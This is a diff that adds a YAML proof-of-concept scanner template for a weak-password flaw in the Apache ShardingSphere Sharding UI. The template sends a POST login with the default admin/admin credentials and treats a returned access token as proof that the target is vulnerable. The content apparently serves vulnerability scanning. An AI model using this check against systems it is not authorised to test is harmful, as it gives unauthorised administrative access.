@@ -1,0 +1,19 @@
+id: poc-yaml-apache-shardingsphere-weak-pass
+info:
+  name: Apache ShardingSphere Sharding UI 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Apache ShardingSphere
+  osprey-id: vb_2020_0018
+requests:
+- method: POST
+  path: /api/login
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"username": "admin", "password": "admin"}'
+  expression: 'status_code == 200 && contains(body, "{\"success\":true,\"errorCode\":0,\"model\":{\"accessToken\":")
+
+    '
+variables: {}
+transport: http
